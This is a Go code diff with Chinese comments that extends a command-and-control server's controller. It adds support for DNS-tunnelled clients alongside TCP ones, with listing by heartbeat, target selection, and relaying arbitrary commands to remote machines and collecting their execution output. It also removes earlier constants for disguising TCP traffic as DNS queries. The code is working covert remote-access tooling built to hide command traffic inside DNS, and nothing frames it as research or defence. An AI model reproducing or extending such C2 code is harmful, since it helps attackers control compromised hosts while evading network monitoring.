@@ -35,50 +35,18 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
-)
-
-// DNS消息结构定义，用于将TCP数据伪装成DNS查询/响应
-type DNSHeader struct {
-	ID      uint16 // 会话标识符
-	Flags   uint16 // 标志位
-	QDCount uint16 // 查询数量
-	ANCount uint16 // 回答数量
-	NSCount uint16 // 权威记录数量
-	ARCount uint16 // 附加记录数量
-}
-
-// DNS查询类型常量
-const (
-	DNS_TYPE_A     = 1  // A记录
-	DNS_TYPE_AAAA  = 28 // AAAA记录
-	DNS_TYPE_CNAME = 5  // CNAME记录
-	DNS_TYPE_TXT   = 16 // TXT记录 - 用于传输命令和数据
-	DNS_CLASS_IN   = 1  // Internet类
-)
-
-// DNS标志位定义
-const (
-	DNS_FLAG_QR = 0x8000 // 查询(0)/响应(1)
-	DNS_FLAG_AA = 0x0400 // 权威回答
-	DNS_FLAG_RD = 0x0100 // 递归期望
-	DNS_FLAG_RA = 0x0080 // 递归可用
-)
-
-// DNS伪装相关常量
-const (
-	DNS_MAX_PAYLOAD    = 512            // DNS UDP最大载荷
-	DNS_DOMAIN_SUFFIX  = ".example.com" // 伪装域名后缀
-	COMMAND_SUBDOMAIN  = "cmd"          // 命令子域名
-	RESPONSE_SUBDOMAIN = "resp"         // 响应子域名
+	"unicode/utf8"
 )
 
 // Controller 表示与控制端的通信会话
 type Controller struct {
-	conn         net.Conn
-	server       *Server
-	reader       *bufio.Reader
-	activeClient *Client
+	conn            net.Conn
+	server          *Server
+	reader          *bufio.Reader
+	activeClient    *Client    // 活动的TCP客户端
+	activeDNSClient *DNSClient // 活动的DNS客户端
 }
 
 // NewController 创建新的控制端通信会话
@@ -122,51 +90,133 @@ func (c *Controller) handleCommands() {
 		} else if strings.HasPrefix(cmdStr, "choose ") {
 			c.handleChooseNode(cmdStr)
 		} else if c.activeClient != nil {
-			// 如果已选择客户端，将命令通过DNS伪装转发给它
+			// 如果已选择TCP客户端，将命令通过DNS伪装转发给它
 			c.handleClientCommandWithDNS(cmdStr)
+		} else if c.activeDNSClient != nil {
+			// 如果已选择DNS客户端，将命令通过真实DNS隧道转发给它
+			c.handleDNSClientCommand(cmdStr)
 		} else {
-			c.sendMessage("未知命令或未选择客户端。请先使用 'choose <id>' 选择客户端。")
+			c.sendMessage("未知命令或未选择客户端。请先使用 'choose <类型-id>' 选择客户端。")
+			c.sendMessage("使用 'list nodes' 查看可用客户端")
 		}
 	}
 }
 
-// handleListNodes 处理list nodes命令，使用TCP通信响应控制端
+// handleListNodes 处理list nodes命令，列出TCP和DNS客户端
 func (c *Controller) handleListNodes() {
-	clients := c.server.ListClients()
-	if len(clients) == 0 {
-		c.sendMessage("没有客户端连接")
-		return
+	fmt.Printf("[控制端] 处理list nodes命令...\n")
+
+	// 获取TCP客户端
+	tcpClients := c.server.ListClients()
+	fmt.Printf("[控制端] TCP客户端数量: %d\n", len(tcpClients))
+
+	// 获取DNS客户端
+	var dnsClients []*DNSClient
+	if c.server.dnsServer != nil {
+		fmt.Printf("[控制端] DNS服务器已设置，开始获取DNS客户端列表...\n")
+		dnsClients = c.server.dnsServer.ListClients()
+		fmt.Printf("[控制端] DNS服务器返回的客户端数量: %d\n", len(dnsClients))
+	} else {
+		fmt.Printf("[控制端] ❌ DNS服务器未设置！\n")
 	}
 
+	// 构建响应消息
 	message := "已连接的客户端:\n"
-	for _, client := range clients {
-		message += fmt.Sprintf("%s\n", client.GetInfo())
+	message += "=== TCP客户端 (旧版本) ===\n"
+	if len(tcpClients) == 0 {
+		message += "  无TCP客户端\n"
+	} else {
+		for _, client := range tcpClients {
+			message += fmt.Sprintf("  TCP-%s\n", client.GetInfo())
+		}
 	}
+
+	message += "=== DNS隧道客户端 (新版本) ===\n"
+	if len(dnsClients) == 0 {
+		message += "  无DNS客户端 (30秒内无心跳)\n"
+		fmt.Printf("[控制端] DNS客户端列表为空 - 可能原因：\n")
+		fmt.Printf("  1. 没有客户端连接\n")
+		fmt.Printf("  2. 客户端超过30秒未发送心跳\n")
+		fmt.Printf("  3. DNS服务器未正确处理心跳\n")
+	} else {
+		fmt.Printf("[控制端] 发现 %d 个活跃DNS客户端\n", len(dnsClients))
+		for i, client := range dnsClients {
+			lastSeen := time.Since(client.LastSeen)
+			message += fmt.Sprintf("  DNS-%s (最后活动: %v前)\n", client.ID, lastSeen.Round(time.Second))
+			fmt.Printf("[控制端] DNS客户端 %d: %s, 最后活动: %v前\n",
+				i+1, client.ID, lastSeen.Round(time.Second))
+		}
+	}
+
+	// 发送响应
 	c.sendMessage(message)
+
+	// 如果没有任何客户端，提供额外的诊断信息
+	if len(tcpClients) == 0 && len(dnsClients) == 0 {
+		diagMessage := "\n诊断信息:\n"
+		diagMessage += "- 确保客户端正在运行并发送心跳\n"
+		diagMessage += "- 检查DNS服务器是否在正确端口监听\n"
+		diagMessage += "- 客户端需在30秒内发送心跳才会显示\n"
+		c.sendMessage(diagMessage)
+		fmt.Printf("[控制端] 发送诊断信息\n")
+	}
+
+	fmt.Printf("[控制端] list nodes 命令处理完成\n")
 }
 
-// handleChooseNode 处理choose命令，使用TCP通信响应控制端
+// handleChooseNode 处理choose命令，支持选择TCP或DNS客户端
 func (c *Controller) handleChooseNode(cmdStr string) {
 	parts := strings.Split(cmdStr, " ")
 	if len(parts) != 2 {
-		c.sendMessage("无效的命令格式。使用方法: choose <id>")
+		c.sendMessage("无效的命令格式。使用方法: choose <类型-id>")
+		c.sendMessage("示例: choose TCP-1 或 choose DNS-192.168.1.100")
 		return
 	}
 
-	id, err := strconv.Atoi(parts[1])
-	if err != nil {
-		c.sendMessage("无效的客户端ID")
-		return
-	}
+	target := parts[1]
 
-	client := c.server.GetClient(id)
-	if client == nil {
-		c.sendMessage(fmt.Sprintf("未找到ID为 %d 的客户端", id))
-		return
-	}
+	// 解析客户端类型和ID
+	if strings.HasPrefix(target, "TCP-") {
+		// 选择TCP客户端
+		idStr := strings.TrimPrefix(target, "TCP-")
+		id, err := strconv.Atoi(idStr)
+		if err != nil {
+			c.sendMessage("无效的TCP客户端ID")
+			return
+		}
 
-	c.activeClient = client
-	c.sendMessage(fmt.Sprintf("已选择客户端 #%d", id))
+		client := c.server.GetClient(id)
+		if client == nil {
+			c.sendMessage(fmt.Sprintf("未找到ID为 %d 的TCP客户端", id))
+			return
+		}
+
+		c.activeClient = client
+		c.activeDNSClient = nil
+		c.sendMessage(fmt.Sprintf("已选择TCP客户端 #%d", id))
+
+	} else if strings.HasPrefix(target, "DNS-") {
+		// 选择DNS客户端
+		clientID := strings.TrimPrefix(target, "DNS-")
+
+		var dnsClient *DNSClient
+		if c.server.dnsServer != nil {
+			dnsClient = c.server.dnsServer.GetClient(clientID)
+		}
+
+		if dnsClient == nil {
+			c.sendMessage(fmt.Sprintf("未找到ID为 %s 的DNS客户端", clientID))
+			return
+		}
+
+		c.activeDNSClient = dnsClient
+		c.activeClient = nil
+		c.sendMessage(fmt.Sprintf("已选择DNS客户端 %s", clientID))
+
+	} else {
+		c.sendMessage("无效的客户端类型。请使用 TCP-<id> 或 DNS-<ip> 格式")
+		c.sendMessage("使用 'list nodes' 查看可用客户端")
+	}
 }
 
 // handleClientCommandWithDNS 处理发送到客户端的命令，使用DNS伪装与客户端通信
@@ -183,7 +233,31 @@ func (c *Controller) handleClientCommandWithDNS(cmdStr string) {
 		return
 	}
 
-	// 通过普通TCP发送结果给控制端
+	// 详细调试客户端返回的数据
+	fmt.Printf("[服务器调试] 收到客户端原始结果，长度: %d 字符\n", len(result))
+	fmt.Printf("[服务器调试] 结果内容（原始字节）: %v\n", []byte(result))
+
+	// 检查每个字符的有效性
+	invalidCount := 0
+	for i, r := range result {
+		if r == utf8.RuneError {
+			if i < 10 { // 只显示前10个无效字符位置
+				fmt.Printf("[服务器调试] 无效UTF-8字符位置: %d, 字节值: %02x\n", i, result[i])
+			}
+			invalidCount++
+		}
+	}
+
+	fmt.Printf("[服务器调试] 总无效字符数: %d\n", invalidCount)
+
+	// 使用更宽松的处理方式，尝试修复而不是拒绝数据
+	if invalidCount > 0 {
+		fmt.Printf("[服务器调试] 发现无效UTF-8字符，尝试修复...\n")
+		// 使用ToValidUTF8替换无效字符
+		result = strings.ToValidUTF8(result, "?")
+		fmt.Printf("[服务器调试] 修复后结果长度: %d 字符\n", len(result))
+	}
+
 	responseMessage := fmt.Sprintf("客户端 #%d 返回结果:\n%s", c.activeClient.ID, result)
 	c.sendMessage(responseMessage)
 }
@@ -245,16 +319,33 @@ func (c *Controller) sendDNSMessage(message string) {
 	time.Sleep(5 * time.Millisecond)
 }
 
-// sendMessage 原始的消息发送方法（保留作为备用）
+// sendMessage 原始的消息发送方法，确保UTF-8编码正确
 func (c *Controller) sendMessage(msg string) {
+	// 确保消息是有效的UTF-8编码
+	if !utf8.ValidString(msg) {
+		fmt.Printf("[控制端] ⚠️  警告：尝试发送非UTF-8编码的消息，长度: %d\n", len(msg))
+		// 清理无效的UTF-8字符
+		msg = strings.ToValidUTF8(msg, "�")
+	}
+
 	// 确保消息以换行符结尾
 	if !strings.HasSuffix(msg, "\n") {
 		msg += "\n"
 	}
 
+	// 转换为UTF-8字节
+	msgBytes := []byte(msg)
+
+	// 打印发送的响应数据内容（限制长度以便阅读）
+	msgPreview := strings.ReplaceAll(msg, "\n", "\\n")
+	if len(msgPreview) > 100 {
+		msgPreview = msgPreview[:100] + "..."
+	}
+	fmt.Printf("[控制端] 📤 发送响应: %s (总字节: %d)\n", msgPreview, len(msgBytes))
+
 	// 分块发送大消息
 	const chunkSize = 1024 // 1KB一块
-	messageLength := len(msg)
+	messageLength := len(msgBytes)
 
 	for i := 0; i < messageLength; i += chunkSize {
 		end := i + chunkSize
@@ -262,10 +353,10 @@ func (c *Controller) sendMessage(msg string) {
 			end = messageLength
 		}
 
-		chunk := msg[i:end]
-		_, err := c.conn.Write([]byte(chunk))
+		chunk := msgBytes[i:end]
+		_, err := c.conn.Write(chunk)
 		if err != nil {
-			fmt.Println("向控制端发送消息失败:", err)
+			fmt.Printf("[控制端] ❌ 向控制端发送消息失败: %v\n", err)
 			return
 		}
 
@@ -274,6 +365,8 @@ func (c *Controller) sendMessage(msg string) {
 			time.Sleep(5 * time.Millisecond)
 		}
 	}
+
+	fmt.Printf("[控制端] ✅ 响应发送完成\n")
 }
 
 // generateDNSID 生成DNS消息ID
@@ -691,4 +784,99 @@ func (c *Controller) parseDNSResponse(data []byte) (string, error) {
 	fmt.Printf("[调试] Base64解码响应 - 输入长度: %d，输出UTF-8字节: %d，结果长度: %d 字符\n",
 		encodedData.Len(), len(decodedBytes), len(result))
 	return result, nil
+}
+
+// isValidUTF8 检查字符串是否为有效的UTF-8编码
+func isValidUTF8(s string) bool {
+	return utf8.ValidString(s)
+}
+
+// handleDNSClientCommand 处理发送到DNS客户端的命令
+func (c *Controller) handleDNSClientCommand(cmdStr string) {
+	if c.server.dnsServer == nil {
+		c.sendMessage("DNS服务器不可用")
+		return
+	}
+
+	fmt.Printf("[控制端] 向DNS客户端 %s 发送命令: %s\n", c.activeDNSClient.ID, cmdStr)
+
+	// 通过DNS服务器发送命令
+	err := c.server.dnsServer.SendCommandToClient(c.activeDNSClient.ID, cmdStr)
+	if err != nil {
+		c.sendMessage(fmt.Sprintf("发送命令失败: %v", err))
+		return
+	}
+
+	c.sendMessage(fmt.Sprintf("命令已发送到DNS客户端 %s，等待执行结果...", c.activeDNSClient.ID))
+
+	// 等待执行结果 - 这里需要实现一个结果等待机制
+	// 由于DNS客户端的结果是异步返回的，我们需要设置一个等待机制
+	result, err := c.waitForDNSResult(c.activeDNSClient.ID, 60*time.Second)
+	if err != nil {
+		c.sendMessage(fmt.Sprintf("等待执行结果失败: %v", err))
+		// 检查客户端是否仍然连接
+		if time.Since(c.activeDNSClient.LastSeen) > 30*time.Second {
+			c.sendMessage("DNS客户端可能已断开连接，将取消选择")
+			c.activeDNSClient = nil
+		}
+		return
+	}
+
+	// 发送结果给控制端
+	c.sendMessage(fmt.Sprintf("执行结果:\n%s", result))
+}
+
+// waitForDNSResult 等待DNS客户端的执行结果
+func (c *Controller) waitForDNSResult(clientID string, timeout time.Duration) (string, error) {
+	// 这里需要实现一个等待机制来获取DNS客户端的执行结果
+	// 由于DNS客户端的结果是通过DNS查询异步返回的，我们需要一个通知机制
+
+	// 简化实现：创建一个结果通道，等待DNS服务器通知结果
+	resultChan := make(chan string, 1)
+	timeoutChan := time.After(timeout)
+
+	// 注册结果等待（这里需要在DNS服务器中实现相应的通知机制）
+	c.registerResultWaiter(clientID, resultChan)
+
+	select {
+	case result := <-resultChan:
+		return result, nil
+	case <-timeoutChan:
+		c.unregisterResultWaiter(clientID)
+		return "", fmt.Errorf("等待执行结果超时")
+	}
+}
+
+// resultWaiters 存储等待结果的通道
+var resultWaiters = make(map[string]chan string)
+var resultWaitersMu sync.Mutex
+
+// registerResultWaiter 注册结果等待通道
+func (c *Controller) registerResultWaiter(clientID string, resultChan chan string) {
+	resultWaitersMu.Lock()
+	defer resultWaitersMu.Unlock()
+	resultWaiters[clientID] = resultChan
+}
+
+// unregisterResultWaiter 取消注册结果等待通道
+func (c *Controller) unregisterResultWaiter(clientID string) {
+	resultWaitersMu.Lock()
+	defer resultWaitersMu.Unlock()
+	delete(resultWaiters, clientID)
+}
+
+// NotifyResult 通知控制端执行结果（由DNS服务器调用）
+func NotifyResult(clientID, result string) {
+	resultWaitersMu.Lock()
+	defer resultWaitersMu.Unlock()
+
+	if resultChan, exists := resultWaiters[clientID]; exists {
+		select {
+		case resultChan <- result:
+			fmt.Printf("[控制端] 已通知客户端 %s 的执行结果\n", clientID)
+		default:
+			fmt.Printf("[控制端] 结果通道已满，客户端: %s\n", clientID)
+		}
+		delete(resultWaiters, clientID)
+	}
 }
